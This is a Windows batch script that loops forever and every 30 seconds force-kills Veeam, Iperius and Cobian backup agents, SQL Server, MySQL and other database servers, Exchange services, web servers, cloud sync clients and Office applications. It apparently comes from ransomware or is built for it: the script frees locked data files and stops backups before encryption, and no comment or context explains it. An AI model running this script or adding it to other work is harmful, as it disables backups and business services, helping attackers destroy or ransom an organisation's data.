:loop
rem VEAM
taskkill /F /IM Veeam.Backup.Agent.ConfigurationService.exe
taskkill /F /IM Veeam.Backup.BrokerService.exe
taskkill /F /IM Veeam.Backup.CatalogDataService.exe
taskkill /F /IM Veeam.Backup.CloudService.exe
taskkill /F /IM Veeam.Backup.Manager.exe
taskkill /F /IM Veeam.Backup.MountService.exe
taskkill /F /IM Veeam.Backup.Serivce.exe
taskkill /F /IM Veeam.Backup.WmiServer.exe
taskkill /F /IM Veeam.Backup.Guest.Interaction.Proxy.exe
taskkill /F /IM VeeamdeploymentSvc.exe
taskkill /F /IM VeeamNFSSvc.exe
taskkill /F /IM VeeamTransportSvc.exe
taskkill /F /IM Veeam.EndPoint.Manager.exe
taskkill /F /IM Veeam.EndPoint.Service.exe
taskkill /F /IM Veeam.EndPoint.Tray.exe
taskkill /F /IM sqlbrowser.exe
taskkill /F /IM sqlceip.exe
taskkill /F /IM sqlservr.exe
taskkill /F /IM sqlwriter.exe
taskkill /F /IM sqlagentc.exe
taskkill /F /IM ReportingServicesService.exe
taskkill /F /IM Ssms.exe
taskkill /F /IM fdhost.exe
taskkill /F /IM fdlauncher.exe
taskkill /F /IM MsDtsSrvr.exe
taskkill /F /IM msmdsrv.exe
taskkill /F /IM mysql.exe
taskkill /F /IM mysqld.exe
taskkill /F /IM w3wp.exe
taskkill /F /IM node.exe
taskkill /F /IM slack.exe
taskkill /F /IM wsusservice.exe
taskkill /F /IM SageCSClient.exe
taskkill /F /IM agent.exe
taskkill /F /IM Dropbox.exe
taskkill /F /IM OneDrive.exe
taskkill /F /IM acrotray.exe

rem MSExchange

taskkill /F /IM store.exe
taskkill /F /IM MSExchangeMailboxReplication.exe
taskkill /F /IM Microsoft.Exchange.ProtectedServiceHost.exe
taskkill /F /IM MSExchangeThrottling.exe
taskkill /F /IM EdgeTransport.exe
taskkill /F /IM MSExchangeTransportLogSearch.exe
taskkill /F /IM Microsoft.Exchange.RpcClientAccess.Service.exe
taskkill /F /IM Microsoft.Exchange.AddressBook.Service.exe
taskkill /F /IM DataCollectorSvc.exe
taskkill /F /IM Microsoft.Exchange.ServiceHost.exe
taskkill /F /IM Microsoft.Exchange.ContentFilter.Wrapper.exe
taskkill /F /IM MSExchangeMialboxAssistants.exe
taskkill /F /IM msexchangerepl.exe
taskkill /F /IM Microsoft.Exchange.Search.ExSearch.exe
taskkill /F /IM Microsoft.Exchange.EdgeSyncSvc.exe
taskkill /F /IM MSExchangeFDS.exe
taskkill /F /IM MSExchangeMailSubmission.exe
taskkill /F /IM MSExchangeTransport.exe
taskkill /F /IM Microsoft.Exchange.AntispamUpdateSvc.exe

rem FileZilla
taskkill /F /IM "FileZilla Server.exe"
taskkill /F /IM FileZilla.exe

rem Iperius
taskkill /F /IM Iperius.exe
taskkill /F /IM iptray.exe

rem JAVA
taskkill /F /IM java.exe
taskkill /F /IM javaw.exe
taskkill /F /IM jucheck.exe
taskkill /F /IM jusched.exe

rem httpd
taskkill /F /IM httpd.exe

rem Cobian
taskkill /F /IM cbService.exe
taskkill /F /IM cbInterface.exe

rem PVX
taskkill /F /IM pvxwin32.exe
taskkill /F /IM pvxwin64.exe
taskkill /F /IM pvxcom.exe
taskkill /F /IM pvxiosvr.exe

rem Sage.NA.AT
taskkill /F /IM Sage.NA.AT_AU.SysTray.exe
taskkill /F /IM Sage.NA.AT_AU.Service.exe

rem dbsrv
taskkill /F /IM dbsrv.exe
taskkill /F /IM dbsrv1.exe
taskkill /F /IM dbsrv2.exe
taskkill /F /IM dbsrv3.exe
taskkill /F /IM dbsrv4.exe
taskkill /F /IM dbsrv5.exe
taskkill /F /IM dbsrv6.exe
taskkill /F /IM dbsrv7.exe
taskkill /F /IM dbsrv8.exe
taskkill /F /IM dbsrv9.exe
taskkill /F /IM dbsrv10.exe
taskkill /F /IM dbsrv11.exe
taskkill /F /IM dbsrv12.exe
taskkill /F /IM dbsrv13.exe
taskkill /F /IM dbsrv14.exe
taskkill /F /IM dbsrv15.exe

rem OFFICE
taskkill /F /IM EXCEL.exe
taskkill /F /IM OUTLOOK.exe
taskkill /F /IM WINWORD.exe
taskkill /F /IM OneDrive.exe
taskkill /F /IM DataCollect.exe

TIMEOUT /T 30
echo Loop
goto loop
